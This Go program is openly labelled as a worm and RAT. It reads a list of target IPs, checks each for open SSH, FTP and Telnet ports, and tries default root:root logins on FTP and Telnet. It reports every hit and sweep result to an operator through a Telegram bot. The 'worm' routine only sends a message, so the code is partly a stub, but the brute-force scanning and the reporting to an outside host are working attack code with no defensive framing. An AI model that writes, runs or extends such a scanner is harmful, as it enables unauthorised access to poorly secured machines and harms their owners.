package main

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "strings"
    "time"
    "bytes"
    "net/http"
    "encoding/json"
)

type Config struct {
    TelegramToken string `json:"telegram_token"`
    TelegramChat  string `json:"telegram_chat_id"`
}

func readConfig() Config {
    var cfg Config
    file, err := os.ReadFile("config.json")
    if err == nil {
        json.Unmarshal(file, &cfg)
    }

    // Fallback to environment variables
    if token := os.Getenv("TELEGRAM_TOKEN"); token != "" {
        cfg.TelegramToken = token
    }
    if chat := os.Getenv("TELEGRAM_CHAT_ID"); chat != "" {
        cfg.TelegramChat = chat
    }

    return cfg
}

func sendTelegramMessage(cfg Config, msg string) {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.TelegramToken)
    data := []byte(fmt.Sprintf("chat_id=%s&text=%s", cfg.TelegramChat, msg))
    http.Post(url, "application/x-www-form-urlencoded", bytes.NewBuffer(data))
}

func worm(ip string) {
    sendTelegramMessage(readConfig(), "[WORM] Infecting " + ip)
}

func trySSH(ip string) {
    conn, err := net.DialTimeout("tcp", ip+":22", 3*time.Second)
    if err == nil {
        conn.Close()
        sendTelegramMessage(readConfig(), "[SSH] Open SSH @ "+ip+" (try root:root)")
        worm(ip)
    }
}

func tryFTP(ip string) {
    conn, err := net.DialTimeout("tcp", ip+":21", 3*time.Second)
    if err == nil {
        defer conn.Close()
        conn.Write([]byte("USER root\r\n"))
        conn.Write([]byte("PASS root\r\n"))
        buf := make([]byte, 1024)
        conn.SetReadDeadline(time.Now().Add(3 * time.Second))
        n, _ := conn.Read(buf)
        banner := string(buf[:n])
        if strings.Contains(banner, "230") || strings.Contains(banner, "Login") {
            sendTelegramMessage(readConfig(), "[FTP] Weak login @ "+ip)
            worm(ip)
        }
    }
}

func tryTelnet(ip string) {
    conn, err := net.DialTimeout("tcp", ip+":23", 3*time.Second)
    if err == nil {
        defer conn.Close()
        conn.Write([]byte("root\n"))
        time.Sleep(1 * time.Second)
        conn.Write([]byte("root\n"))
        buf := make([]byte, 1024)
        conn.SetReadDeadline(time.Now().Add(3 * time.Second))
        n, _ := conn.Read(buf)
        banner := string(buf[:n])
        if strings.Contains(banner, "Last login") || strings.Contains(banner, "$") {
            sendTelegramMessage(readConfig(), "[TELNET] Weak login @ "+ip)
            worm(ip)
        }
    }
}

func loadTargets() []string {
    data, err := os.ReadFile("targets.txt")
    if err != nil {
        return []string{}
    }
    lines := strings.Split(string(data), "\n")
    return lines
}

func main() {
    cfg := readConfig()
    targets := loadTargets()
    for _, ip := range targets {
        go trySSH(ip)
        go tryFTP(ip)
        go tryTelnet(ip)
    }
    sendTelegramMessage(cfg, fmt.Sprintf("[RAT] Finished sweep of %d targets.", len(targets)))
    time.Sleep(15 * time.Second)
}